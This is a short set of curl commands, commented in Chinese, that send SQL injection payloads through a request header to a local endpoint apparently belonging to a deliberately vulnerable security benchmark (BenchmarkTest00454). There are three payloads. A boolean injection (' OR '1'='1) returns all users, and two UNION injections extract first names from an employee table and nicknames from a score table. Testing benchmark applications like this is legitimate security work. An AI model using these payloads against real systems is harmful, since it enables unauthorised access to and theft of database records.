# 布尔注入 - 返回所有用户
curl -X POST "http://localhost:8443/benchmark/sqli-00/BenchmarkTest00454" \
  -H "BenchmarkTest00454: ' OR '1'='1"

# UNION注入 - 从 employee 表提取数据
curl -X POST "http://localhost:8443/benchmark/sqli-00/BenchmarkTest00454" \
  -H "BenchmarkTest00454: ' UNION SELECT first_name FROM employee WHERE '1'='1"

# UNION注入 - 从 score 表提取数据
curl -X POST "http://localhost:8443/benchmark/sqli-00/BenchmarkTest00454" \
  -H "BenchmarkTest00454: ' UNION SELECT nick FROM score WHERE '1'='1"